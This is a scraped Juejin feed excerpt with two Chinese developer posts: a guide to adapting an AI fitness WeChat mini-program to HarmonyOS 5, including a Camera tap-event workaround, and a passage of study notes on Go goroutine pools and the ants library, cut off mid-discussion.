itemprop="datePublished" content="2025-11-24T04:03:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云智科技的技术小铺"/> <meta itemprop="url" content="https://juejin.cn/user/2491969751759002"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI运动小程序鸿蒙平台适配指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2491969751759002/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云智科技的技术小铺
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:03:13.000Z" title="Mon Nov 24 2025 04:03:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>鸿蒙5的首版发布距现在已快满一年了，同时伴随着华为终端芯片制造的突破，搭载有HarmonyOS5的终端及用户的保有量在不断的上升，各大厂商的APP也在逐渐适配鸿蒙生态，微信小程序生态也在逐渐适配成熟，移动端适配HarmonyOS生态已势在必行。今天我们就结合我们一段时间以来「Ai乐运动」用户的反馈、实测验证，来聊聊AI运动小程序在鸿蒙端的适配。
<strong>注：本文主要介绍适配鸿蒙5以及后的HarmonyOS Next纯血版鸿蒙版本，HarmonyOS 4及以前的版本因为还兼容Android生态、微信小程序运行时也与Android版本无差异，所以无需特别适配。</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/153034e9900745dc973dcd9e5354ce3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5pm656eR5oqA55qE5oqA5pyv5bCP6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561792&amp;x-signature=0ioYfJrPlENrJ95RyouqMl4%2FI9o%3D" alt="d52a2834349b033b620dd46d5e0782dcd739bddc" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-0">一、AI运动识别插件在鸿蒙5的实测表现</h2>
<p>使用版<code>v8.0.11</code>微信分别在<code>Harmony5.0.1</code>和<code>Harmony5.1.0</code>的实际测试结果如下：</p>













































<table><thead><tr><th align="center">功能</th><th align="center">功能表现</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">识别引擎ve1</td><td align="center">正常</td><td align="center"><em>但精度不佳</em>，与MTK芯片问题一致，开启<strong>增强模式</strong>即可解决</td></tr><tr><td align="center">识别引擎ve1，增强模式</td><td align="center">正常</td><td align="center">Harmony5+建议识别模式</td></tr><tr><td align="center">识别引擎ve1</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">骨骼图绘制</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">资态识别</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">运动识别检测</td><td align="center">正常</td><td align="center"/></tr><tr><td align="center">运动自定义扩展</td><td align="center">正常</td><td align="center"/></tr></tbody></table>
<blockquote>
<p>测试使用时的插件版本为当前最新版本<code>1.5.8</code>，从结果看<strong>AI运动识别插件</strong>的功能在鸿蒙5的表现不存在兼容性问题，可以正常使用。</p>
</blockquote>
<h2 data-id="heading-1">二、AI运动小程序在鸿蒙5的兼容性问题</h2>
<p>使用微信版本<code>v8.0.11</code>分别在<code>Harmony5.0.1</code>用<code>Harmony5.1.0</code>测试兼容问题主要表现在小程序的<code>Camera组件</code>，问题为<code>Camera</code>的非原生事件，即<code>Web</code>渲染层事件如<code>tap</code>、<code>touch___</code>相关事件完全不触发或偶尔触发但是没有冒泡向上传播，代码如下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"human-detection"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"videoStyles"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onWrapperClick"</span>&gt;</span>
		<span class="hljs-comment">&lt;!--原生initdone、error事件能正常触发，但是渲染层事件tap不触发，或者偶尔触发但不冒泡--&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">camera</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span> <span class="hljs-attr">flash</span>=<span class="hljs-string">"off"</span> <span class="hljs-attr">:device-position</span>=<span class="hljs-string">"deviceKey"</span>
			<span class="hljs-attr">resolution</span>=<span class="hljs-string">"medium"</span> <span class="hljs-attr">frame-size</span>=<span class="hljs-string">"small"</span> @<span class="hljs-attr">initdone</span>=<span class="hljs-string">"onCameraReady"</span> @<span class="hljs-attr">error</span>=<span class="hljs-string">"onCameraError"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onCameraClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">camera</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>如果您的<code>AI运动小程序</code>依赖<code>Camera</code>组件的非原生事件来交互，如全屏模式下点击组件打开操作菜单等，在小程序运行时彻底修复上述问题之前，可以考虑先采用在<code>Camera</code>组件覆盖一个一样大小、透明的非原生组件如<code>view</code>来解决此问题，代码如何下：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"human-detection"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"videoStyles"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onWrapperClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">camera</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"preview"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span> <span class="hljs-attr">flash</span>=<span class="hljs-string">"off"</span> <span class="hljs-attr">:device-position</span>=<span class="hljs-string">"deviceKey"</span>
			<span class="hljs-attr">resolution</span>=<span class="hljs-string">"medium"</span> <span class="hljs-attr">frame-size</span>=<span class="hljs-string">"small"</span> @<span class="hljs-attr">initdone</span>=<span class="hljs-string">"onCameraReady"</span> @<span class="hljs-attr">error</span>=<span class="hljs-string">"onCameraError"</span> @<span class="hljs-attr">tap</span>=<span class="hljs-string">"onCameraClick"</span>&gt;</span>
		<span class="hljs-tag">&lt;/<span class="hljs-name">camera</span>&gt;</span>
		<span class="hljs-comment">&lt;!--增加一个遮罩层来承担交互，保证非原生事件能正常触发--&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"hramony-fix"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"videoStyles"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span>{
	<span class="hljs-title function_">data</span>(<span class="hljs-params"/>){
		<span class="hljs-keyword">return</span> {};
	},
	<span class="hljs-attr">methods</span>:{
		<span class="hljs-title function_">onCameraClick</span>(<span class="hljs-params">e</span>){
			<span class="hljs-comment">//不会触发</span>
		},
		<span class="hljs-title function_">onWrapperClick</span>(<span class="hljs-params">e</span>){
			<span class="hljs-comment">//修补可以正常触发</span>
		}
	}
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-2">三、在纯血鸿蒙下的适配指引</h2>
<ul>
<li>3.1、将AI运动识别插件升级到最新版本，并为纯血鸿蒙版本的用户开启<code>增强模式</code>。</li>
<li>3.2、提示或调用API引导用户升级到最新版本的微信。</li>
<li>3.3、若存在依赖<code>Camera</code>组件非原生事件交互的问题，可使用上述临时方案修复交互。</li>
</ul>
<blockquote>
<p>AI运动小程序在纯血鸿蒙下的适配就为您介绍到这，若有其它的适配场景我们继续为您分享，欢迎关注...</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea4dc4891e3440d89f20a8fb35f6f6ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LqR5pm656eR5oqA55qE5oqA5pyv5bCP6ZO6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764561792&amp;x-signature=9%2B8UV8crtIc6HxRPdVmg%2FVIFYmQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[go ants pool 协程池学习笔记]]></title>    <link>https://juejin.cn/post/7575757258833477658</link>    <guid>https://juejin.cn/post/7575757258833477658</guid>    <pubDate>2025-11-24T04:54:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833477658" data-draft-id="7575748159608684570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="go ants pool 协程池学习笔记 "/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-11-24T04:54:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户722786812344"/> <meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go ants pool 协程池学习笔记 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:54:29.000Z" title="Mon Nov 24 2025 04:54:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>使用 Go 开发并发程序很容易，一个 <code>go</code> 关键字就可以启动协程处理任务。Go 创建一个 goroutine 只需要 2K 内存空间，并且 go 协程上下文信息仅存储在两个寄存器中，对于 Go 运行时来说，切换上下文特别快。</p>
<p>不过凡事不加限制就会出问题，如果不加节制的滥用 goroutine 就可能导致内存泄露，增加 Go 运行时调度负担等。</p>
<p>下面看一段 Go http 标准库的代码：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Server)</span></span> Serve(l net.Listener) <span class="hljs-type">error</span> {
	<span class="hljs-keyword">for</span> {
	   ...
	   c := s.newConn(rw)
	   <span class="hljs-keyword">go</span> c.serve(connCtx)  
	}  
}
</code></pre>
<p>当来一个 http 请求，http 会启动一个协程 <code>Server.serve()</code> 处理该请求。<br/>
这种方式对于请求的响应很快，但是如果有恶意大规模并发请求，就可能导致后端服务内存爆增，响应慢等问题。</p>
<p>测试千万并发的内存使用情况如下：</p>
<pre><code class="hljs language-scss" lang="scss">const n = <span class="hljs-number">10000000</span>
    
func <span class="hljs-built_in">demoFunc</span>() {  
    <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Sleep</span>(time.Duration(BenchParam) * <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Millisecond</span>)  
}

func <span class="hljs-built_in">TestNoPool</span>(t *testing.T) {  
    <span class="hljs-selector-tag">var</span> start, end runtime<span class="hljs-selector-class">.MemStats</span>  
    runtime<span class="hljs-selector-class">.ReadMemStats</span>(&amp;start)  
    <span class="hljs-selector-tag">var</span> wg sync<span class="hljs-selector-class">.WaitGroup</span>  
    for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; n; <span class="hljs-selector-tag">i</span>++ {  
       wg<span class="hljs-selector-class">.Add</span>(<span class="hljs-number">1</span>)  
       go <span class="hljs-built_in">func</span>() {  
          <span class="hljs-built_in">demoFunc</span>()  
          wg<span class="hljs-selector-class">.Done</span>()  
       }()  
    }  
    wg<span class="hljs-selector-class">.Wait</span>()  
    runtime<span class="hljs-selector-class">.ReadMemStats</span>(&amp;end)  
    usageMem := end.TotalAlloc/MiB - start.TotalAlloc/MiB  
    t.<span class="hljs-built_in">Logf</span>(<span class="hljs-string">"memory usage:%d MB"</span>, usageMem)  
}
</code></pre>
<p>测试结果：</p>
<pre><code class="hljs language-diff" lang="diff"> go test -v -bench=. -benchmem -run=TestNoPool
<span class="hljs-comment">=== RUN   TestNoPool</span>
    ants_test.go:41: memory usage:1304 M
<span class="hljs-comment">--- PASS: TestNoPool (5.70s）</span>
</code></pre>
<p>当并发量到千万时，内存使用率达到了 1 个多 G，看起来好像不多。不过可别忘了，这里处理的任务只是 <code>time.Sleep</code>，如果每个协程处理内存型或 IO 型任务，那该是多大内存或者 CPU 的消耗，并且调度如此多的协程也会让 Go 运行时（调度器，GC）的压力非常大。</p>
<p>因此，需要协程池来限制协程的使用，起到稳定内存使用率，减轻 Go 运行时负担的目的。</p>
<h2 data-id="heading-1">协程池</h2>
<p>既然协程池的主要任务是限制协程的数量，那么作为池应该有几个需求是要实现的：</p>
<ul>
<li>协程池生命周期管理，包括创建，释放等操作；</li>
<li>协程池的扩缩容，按需使用；</li>
<li>协程池中过期协程的清理；</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpanjf2000%2Fants" target="_blank" title="https://github.com/panjf2000/ants" ref="nofollow noopener noreferrer">ants</a> 是一个满足上述需求的高性能协程池。本文重点学习 <code>ants</code> 的源码了解协程池。</p>
<h2 data-id="heading-2">ants 协程池</h2>
<h3 data-id="heading-3">结构</h3>
<p>首先看代码的层次结构，作为一个协程池库，ants 很扁平，只有一层：</p>
<pre><code class="hljs language-go" lang="go">tree
.
├── CODE_OF_CONDUCT.md
├── CONTRIBUTING.md
├── LICENSE
├── README.md
├── README_ZH.md
├── ants.<span class="hljs-keyword">go</span>
├── ants_benchmark_test.<span class="hljs-keyword">go</span>
├── ants_test.<span class="hljs-keyword">go</span>
├── example_test.<span class="hljs-keyword">go</span>
├── <span class="hljs-keyword">go</span>.mod
├── <span class="hljs-keyword">go</span>.sum
├── multipool.<span class="hljs-keyword">go</span>
├── multipool_func.<span class="hljs-keyword">go</span>
├── multipool_func_generic.<span class="hljs-keyword">go</span>
├── options.<span class="hljs-keyword">go</span>
├── pkg
│   └── sync
│       ├── spinlock.<span class="hljs-keyword">go</span>
│       ├── spinlock_test.<span class="hljs-keyword">go</span>
│       └── sync.<span class="hljs-keyword">go</span>
├── pool.<span class="hljs-keyword">go</span>
├── pool_func.<span class="hljs-keyword">go</span>
├── pool_func_generic.<span class="hljs-keyword">go</span>
├── worker.<span class="hljs-keyword">go</span>
├── worker_func.<span class="hljs-keyword">go</span>
├── worker_func_generic.<span class="hljs-keyword">go</span>
├── worker_loop_queue.<span class="hljs-keyword">go</span>
├── worker_loop_queue_test.<span class="hljs-keyword">go</span>
├── worker_queue.<span class="hljs-keyword">go</span>
├── worker_stack.<span class="hljs-keyword">go</span>
└── worker_stack_test.<span class="hljs-keyword">go</span>
</code></pre>
<p>从结构可以看出，主要分为三类：</p>
<ul>
<li>pool：实现了协程池，是暴露给用户调用的对象；</li>
<li>workqueue：工作队列，负责装载工作协程，其接口实现是 <code>worker_stack</code> 和 <code>worker_loop_queue</code> 对象；</li>
<li>worker：工作协程，是实际执行任务的协程；</li>
</ul>
<p>这个结构还是很清晰的，就不画 UML 图表示了。</p>
<h3 data-id="heading-4">流程</h3>
<h4 data-id="heading-5">设计</h4>
<p>在看流程图之前，先自己想一下，如果让我设计协程池该如何做呢？</p>
<p>平时开发用的比较多的是类似这样的写法：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; workerNumber; i++ {
	<span class="hljs-keyword">go</span> worker()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">()</span></span> {
	<span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> taskC {
		doTask()
	}
}
</code></pre>
<p>程序运行时启动 <code>workerNumber</code> 个协程监听同一个通道 <code>taskC</code>，如果 <code>taskC</code> 有 <code>task</code>，多个协程 <code>worker</code> 会抢 <code>task</code> 并调用 <code>doTask()</code> 处理任务。</p>
<p>这种写法的好处在于简单，缺点在于协程数固定，不能按需灵活使用，而且在程序启动时，<code>workerNumber</code> 个协程就开始运行，如果没有 <code>task</code> 会造成资源浪费。</p>
<p>这种写法对于数量少的协程还行，如果并发过大则需要上协程池了。</p>
<p>使用协程池，还是让 <code>worker</code> 去监听 <code>taskC</code>，不同的是每个 <code>worker</code> 都有自己的 <code>taskC</code>，这样设计的好处是协程 <code>worker</code> 不会打架。</p>
<p>让每个 <code>worker</code> 监听自己的通道，那谁来管理这些 <code>worker</code> 呢？我们可以将这些 <code>worker</code> 存入容器（堆或栈）中。让容器对象来管理 <code>worker</code>，包括插入 <code>worker</code> 到容器，弹出 <code>worker</code> 出容器等。</p>
<p>现在 <code>worker</code> 在容器中了，那什么时候该插入 <code>worker</code> 到容器，什么时候该弹出 <code>worker</code> 呢？</p>
<p>我们想每个 <code>worker</code> 都监听自己的通道，如果 <code>worker</code> 执行完任务就可以插入 <code>worker</code> 到容器，插入 <code>worker</code> 到容器的意思是，该 <code>worker</code> 可用，可以被拿出来执行任务。<br/>
这是插入逻辑，对于弹出，如果生产者需要往 <code>worker</code> 的通道中写任务，发现容器中有一个 <code>worker</code> 可用，就可以从容器中弹出 <code>worker</code> 给生产者使用。弹出的意思是，该 <code>worker</code> 我用了，别人不能在用了。</p>
<p>那么，谁是生产者呢？<br/>
